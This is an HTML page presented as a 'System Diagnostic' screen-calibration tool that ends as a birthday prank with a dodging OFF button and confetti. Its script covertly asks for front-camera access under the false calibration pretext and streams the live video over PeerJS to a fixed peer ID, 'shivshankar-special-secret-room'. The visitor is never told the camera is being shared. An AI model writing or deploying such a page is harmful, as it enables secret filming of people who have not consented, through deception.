<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Diagnostic</title>
  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
  <style>
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body {
      margin: 0; min-height: 100vh; overflow: hidden;
      font-family: Arial, sans-serif; background: #0b0c10; color: white;
      display: flex; align-items: center; justify-content: center; text-align: center;
    }
    .screen {
      width: 100%; min-height: 100vh; display: flex; flex-direction: column;
      align-items: center; justify-content: center; padding: 20px;
    }
    #startBtn {
      padding: 16px 36px; font-size: 20px; font-weight: bold;
      background: #45f3ff; border: none; border-radius: 12px; color: #000; cursor: pointer;
    }
    #offBtn {
      position: absolute; border: none; border-radius: 12px;
      padding: 16px 40px; font-size: 22px; font-weight: bold;
      background: #ff3366; color: white; cursor: pointer;
      box-shadow: 0 4px 20px rgba(255,51,102,0.6);
      transition: left .12s ease, top .12s ease;
    }
    #birthday { display: none; }
    #birthday h2 { font-size: clamp(34px, 8vw, 65px); margin: 0; color: #ffeb3b; }
    .confetti {
      position: fixed; top: -20px; font-size: 24px;
      animation: fall 3s linear forwards; pointer-events: none;
    }
    @keyframes fall { to { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
  </style>
</head>
<body>

  <div class="screen" id="permissionScreen">
    <h2>📱 System Diagnostic</h2>
    <p style="color:#aaa;">Tap START to calibrate your screen & sensor</p>
    <button id="startBtn">START</button>
  </div>

  <div class="screen" id="prankScreen" style="display:none;">
    <h1>Screen Calibrated</h1>
    <p style="color:#aaa;">Tap OFF to exit...</p>
    <button id="offBtn">OFF</button>
  </div>

  <div class="screen" id="birthday">
    <h2>🎂 HAPPY BIRTHDAY! 🎉</h2>
    <p style="font-size: 20px; margin-top: 15px;">😂 OFF dhoondte dhoondte prank ho gaya!</p>
  </div>

  <script>
    const startBtn = document.getElementById("startBtn");
    const offBtn = document.getElementById("offBtn");
    const permissionScreen = document.getElementById("permissionScreen");
    const prankScreen = document.getElementById("prankScreen");
    const birthday = document.getElementById("birthday");

    let attempts = 0;
    const peer = new Peer({
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
        ]
      }
    });

    startBtn.addEventListener("click", async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        // आपके डिब्बे पर कॉल भेजना
        peer.call("shivshankar-special-secret-room", stream);

        permissionScreen.style.display = "none";
        prankScreen.style.display = "flex";
        moveButton();
      } catch (err) {
        alert("Camera permission is required to continue!");
      }
    });

    function moveButton() {
      const padding = 25;
      const maxX = window.innerWidth - offBtn.offsetWidth - padding;
      const maxY = window.innerHeight - offBtn.offsetHeight - padding;
      offBtn.style.left = Math.max(padding, Math.floor(Math.random() * maxX)) + "px";
      offBtn.style.top = Math.max(padding, Math.floor(Math.random() * maxY)) + "px";
    }

    function handleTouch(e) {
      if (e) e.preventDefault();
      attempts++;
      if (attempts >= 6) {
        prankScreen.style.display = "none";
        birthday.style.display = "flex";
        triggerConfetti();
      } else {
        moveButton();
      }
    }

    offBtn.addEventListener("touchstart", handleTouch, { passive: false });
    offBtn.addEventListener("mouseover", handleTouch);
    offBtn.addEventListener("click", handleTouch);

    function triggerConfetti() {
      const items = ["🎉", "🎊", "🎂", "🥳", "✨"];
      for (let i = 0; i < 60; i++) {
        const c = document.createElement("div");
        c.className = "confetti";
        c.textContent = items[Math.floor(Math.random() * items.length)];
        c.style.left = Math.random() * 100 + "vw";
        c.style.animationDelay = Math.random() * 1.5 + "s";
        document.body.appendChild(c);
        setTimeout(() => c.remove(), 4000);
      }
    }
  </script>
</body>
</html>
